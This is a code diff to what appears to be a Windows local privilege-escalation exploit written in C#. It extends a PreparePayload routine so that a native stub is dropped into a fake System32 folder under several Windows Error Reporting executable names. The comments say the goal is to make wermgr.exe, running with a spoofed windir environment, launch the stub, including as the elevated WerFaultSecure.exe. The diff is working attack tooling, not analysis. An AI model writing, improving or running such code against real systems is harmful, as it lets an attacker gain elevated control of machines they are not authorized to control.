@@ -447,28 +447,41 @@ if($r-eq 0){
         } catch {}
     }
 
-    /* Extract native stub from embedded resource and drop as fake wermgr.exe */
+    /* Extract native stub and drop as ALL WER-related executables wermgr.exe might spawn.
+       wermgr.exe runs with our fake windir in its env, so it expands %windir%\System32\X
+       from VE and will launch whichever of these exists first. */
     static string PreparePayload(string runDir)
     {
         string sys32 = Path.Combine(runDir, "System32");
         Directory.CreateDirectory(sys32);
-        string dest = Path.Combine(sys32, "wermgr.exe");
 
-        /* Try embedded resource first */
+        byte[] stub = null;
         var asm = Assembly.GetExecutingAssembly();
         using (var s = asm.GetManifestResourceStream("stub.exe")) {
-            if (s != null) {
-                byte[] b = new byte[s.Length]; s.Read(b, 0, b.Length);
-                File.WriteAllBytes(dest, b);
-                Console.WriteLine($"[+] Dropped native stub -> {dest}");
-                return dest;
-            }
+            if (s != null) { stub = new byte[s.Length]; s.Read(stub, 0, stub.Length); }
         }
-        /* Fallback: copy self (will fail if .NET runtime can't load with fake windir) */
-        string self = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-        File.Copy(self, dest, true);
-        Console.WriteLine($"[+] Dropped self -> {dest} (warning: .NET may fail with fake windir)");
-        return dest;
+        if (stub == null) {
+            string local = Path.Combine(
+                Path.GetDirectoryName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName),
+                "stub.exe");
+            if (File.Exists(local)) stub = File.ReadAllBytes(local);
+        }
+        if (stub == null) { Console.WriteLine("[-] stub not found"); return null; }
+
+        /* Drop stub as every executable wermgr.exe might spawn via %windir%\System32\ */
+        string[] targets = {
+            "WerFaultSecure.exe",   /* elevated crash dump collector */
+            "WerFault.exe",         /* standard fault handler         */
+            "WerConsentHandler.exe",/* consent dialog                 */
+            "WerReportUploader.exe",/* report uploader                */
+            "wermgr.exe",           /* wermgr itself (original target)*/
+        };
+        foreach (var t in targets) {
+            string dest = Path.Combine(sys32, t);
+            File.WriteAllBytes(dest, stub);
+        }
+        Console.WriteLine($"[+] Dropped stub as {targets.Length} WER executables in {sys32}");
+        return sys32;
     }
 
     [DllImport("kernel32.dll")]
